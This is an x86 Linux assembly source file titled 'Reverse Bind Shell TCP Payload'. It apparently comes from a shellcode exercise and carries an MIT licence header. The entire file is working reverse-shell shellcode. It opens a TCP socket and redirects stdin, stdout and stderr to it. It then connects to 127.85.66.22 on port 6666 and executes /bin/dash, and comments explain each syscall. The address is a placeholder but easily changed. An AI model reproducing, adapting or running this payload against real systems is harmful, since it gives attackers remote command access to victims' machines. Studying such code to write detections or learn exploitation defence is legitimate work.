; Reverse Bind Shell TCP Payload
; Website: www.r3oath.com

; Copyright (c) 2013 Tristan Strathearn

; Permission is hereby granted, free of charge, to any person obtaining a copy
; of this software and associated documentation files (the "Software"), to deal
; in the Software without restriction, including without limitation the rights
; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
; copies of the Software, and to permit persons to whom the Software is
; furnished to do so, subject to the following conditions:

; The above copyright notice and this permission notice shall be included in
; all copies or substantial portions of the Software.

; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
; THE SOFTWARE.

; Reverse Binds /bin/dash to the specified address on port 6666

global _start

section .text
_start:

	; Preparation
	xor ebx, ebx
	mov ecx, ebx
	mul ecx

	; Socket
	; int socket(int domain, int type, int protocol);
	; Called through int socketcall(int call, unsigned long *args);

	push eax 		; Push 0x00000000 (int protocol):socket
	inc ebx 		; Load 0x00000001 (int call):socketcall
	push ebx 		; Push 0x00000001 (int type):socket
	push 0x2 		; Push 0x00000002 (int domain):socket
	mov ecx, esp 	; Pointer to above arguments
	mov al, 0x66
	int 0x80

	; Duplicate FDs
	; int dup2(int oldfd, int newfd);
	mov ebx, eax	; Load in out "old" FD (returned by socket)
	xor eax, eax

	mov ecx, eax	; Load our new FD (stdin)
	mov al, 0x3f
	int 0x80

	inc ecx			; Load our new FD (stdout)
	mov al, 0x3f
	int 0x80

	inc ecx			; Load our new FD (stderr)
	mov al, 0x3f
	int 0x80

	; Connect
	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	; Called through int socketcall(int call, unsigned long *args);

	; Setup the const struct sockaddr *addr
	push 0x1642557f 	; IP Address 127.85.66.22 in reverse byte order
	push WORD 0x0a1a 	; Port 6666 in reverse byte order
	push WORD 2 		; Push 0x0002
	mov ecx, esp		; Grab the pointer to the struct above

	push 0x10			; Push 0x00000010/dec-16 (socklen_t addrlen):connect
	push ecx			; Push ECX pointer (const struct sockaddr *addr):connect
	push ebx			; Push our FD (int sockfd):connect

	mov ecx, esp		; Grab the pointer to the arguments

	xor eax, eax
	mov ebx, eax
	mov bl, 0x3 		; Set EBX 0x00000003 (connect socketcall)
	mov al, 0x66
	int 0x80

	; Spawn Shell
	; int execve(const char *filename, char *const argv[], char *const envp[]);
	
	xor eax, eax

	; Prepare argument string
	push eax 	; Push 0x00000000 (null terminating byte)

	; Push "/bin////dash" in reverse byte order
	push 0x68736164	; Push "hsad"
	push 0x2f2f2f2f ; Push "////"
	push 0x6e69622f ; Push "nib/"

	mov edx, eax	; Load 0x00000000 (char *const envp[]):execve
	mov ecx, eax	; Load 0x00000000 (char *const argv[]):execve
	mov ebx, esp	; Load pointer to "/bin////dash" string above (const char *filename):execve

	mov al, 0xb
	int 0x80